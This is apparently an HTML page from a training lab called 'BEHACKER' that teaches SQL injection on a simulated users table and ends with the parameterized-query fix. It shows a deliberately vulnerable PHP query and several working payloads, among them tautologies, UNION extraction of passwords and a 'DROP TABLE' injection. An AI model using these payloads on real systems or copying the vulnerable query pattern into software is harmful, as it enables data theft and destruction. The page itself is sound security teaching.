@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Url — BEHACKER</title>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{background:#0d0f14;color:#c9d1d9;font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;padding:0}
+nav{background:#161b22;border-bottom:1px solid #30363d;padding:12px 24px;display:flex;align-items:center;gap:16px;position:sticky;top:0;z-index:100}
+.nav-brand{color:#c9d1d9;text-decoration:none;font-weight:700;font-size:1.1rem}
+.nav-back{color:#58a6ff;text-decoration:none;font-size:.9rem}
+.nav-back:hover{text-decoration:underline}
+main{max-width:860px;margin:0 auto;padding:40px 24px 80px}
+h1{font-size:2rem;font-weight:700;color:#e6edf3;margin-bottom:8px}
+.subtitle{color:#8b949e;font-size:.95rem;margin-bottom:40px}
+h2{font-size:1.3rem;font-weight:600;color:#e6edf3;margin:36px 0 12px;padding-bottom:6px;border-bottom:1px solid #30363d}
+h3{font-size:1.1rem;font-weight:600;color:#f8c555;margin:24px 0 10px}
+p{line-height:1.7;margin-bottom:14px;color:#c9d1d9}
+ul,ol{margin:0 0 16px 24px;line-height:1.8}
+li{margin-bottom:4px}
+li strong{color:#e6edf3}
+code{background:#161b22;border:1px solid #30363d;border-radius:4px;padding:2px 6px;font-family:'Courier New',monospace;font-size:.88rem;color:#f8c555}
+pre{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:20px;overflow-x:auto;margin:16px 0 24px}
+pre code{background:none;border:none;padding:0;color:#b5e8a0;font-size:.9rem}
+hr{border:none;border-top:1px solid #30363d;margin:32px 0}
+.back-btn{display:inline-block;margin-top:40px;padding:10px 20px;background:#238636;color:#fff;text-decoration:none;border-radius:6px;font-weight:600;font-size:.9rem}
+.back-btn:hover{background:#2ea043}
+strong{color:#e6edf3}
+em{color:#8b949e;font-style:italic}
+</style>
+</head>
+<body>
+<nav>
+  <a href="../../../NAVIGATE.html" class="nav-brand">💀 BEHACKER</a>
+  <a href="index.html" class="nav-back">← Back to Lab</a>
+</nav>
+<main>
+<p>Simulated users table (matches the in-memory DB in script.js):</p>
+
+<pre><code class="language-sql">CREATE TABLE users (
+  id       INTEGER PRIMARY KEY,
+  username TEXT,
+  password TEXT,
+  email    TEXT,
+  role     TEXT
+);</code></pre>
+
+<h2>Normal request</h2>
+
+<p>URL: <code>?id=1</code> — Backend code (vulnerable): <code>$sql = "SELECT * FROM users WHERE id=" . $_GET['id'];</code></p>
+
+<pre><code class="language-sql">SELECT * FROM users WHERE id=1;
+-- Returns: the single row for admin</code></pre>
+
+<h2>Boolean / always-true injection</h2>
+
+<p>URL: <code>?id=1 OR 1=1</code></p>
+
+<pre><code class="language-sql">SELECT * FROM users WHERE id=1 OR 1=1;</code></pre>
+
+<p><code>1=1</code> is always true → WHERE is always true → every row returned. Equivalent to:</p>
+
+<pre><code class="language-sql">SELECT * FROM users;</code></pre>
+
+<h2>String tautology</h2>
+
+<p>URL: <code>?id=1 OR 'a'='a'</code></p>
+
+<pre><code class="language-sql">SELECT * FROM users WHERE id=1 OR 'a'='a';</code></pre>
+
+<p>Same effect: the OR condition is always true. Works even if the developer added single-quote escaping for strings but forgot to cast the numeric field.</p>
+
+<h2>Comment stripping</h2>
+
+<p>URL: <code>?id=1--</code></p>
+
+<pre><code class="language-sql">SELECT * FROM users WHERE id=1-- (rest of query discarded)</code></pre>
+
+<p>In a longer query like <code>WHERE id=1-- AND active=1 AND role='user'</code>, the <code>--</code> discards the AND conditions, bypassing access checks.</p>
+
+<h2>UNION-based data exfiltration</h2>
+
+<p>URL: <code>?id=0 UNION SELECT 1,username,password,role FROM users--</code></p>
+
+<pre><code class="language-sql">SELECT * FROM users WHERE id=0
+UNION SELECT 1,username,password,role FROM users--;</code></pre>
+
+<p><code>id=0</code> matches nothing (intentional — keeps the first SELECT empty). The UNION appends all rows from users with the chosen columns. The attacker picks which columns to extract, including passwords.</p>
+
+<h2>Destructive injection</h2>
+
+<p>URL: <code>?id=1; DROP TABLE users--</code></p>
+
+<pre><code class="language-sql">SELECT * FROM users WHERE id=1;
+DROP TABLE users;</code></pre>
+
+<p>The semicolon starts a new SQL statement. <code>DROP TABLE</code> permanently deletes the entire table and all its data. The <code>--</code> discards anything the backend appended after the parameter.</p>
+
+<hr>
+
+<h2>Why numeric fields are especially easy to inject</h2>
+
+<ul>
+<li>String fields wrap input in quotes: <code>WHERE username='input'</code> → attacker needs a <code>'</code> to escape the string</li>
+<li>Numeric fields have NO quotes: <code>WHERE id=input</code> → SQL operators can be appended directly</li>
+<li>Incorrect "fix" (still vulnerable): <code>WHERE id='$input'</code> → makes it a string comparison but still injectable with <code>' OR '1'='1</code></li>
+</ul>
+
+<p>The correct fix — parameterized queries (prepared statements):</p>
+
+<pre><code class="language-sql">SELECT * FROM users WHERE id=?
+-- value passed separately, never executed as SQL
+-- $stmt-&gt;bind_param("i", $id); — type-checked, not concatenated</code></pre>
+
+<a href="index.html" class="back-btn">← Back to Lab</a>
+</main>
+</body>
+</html>
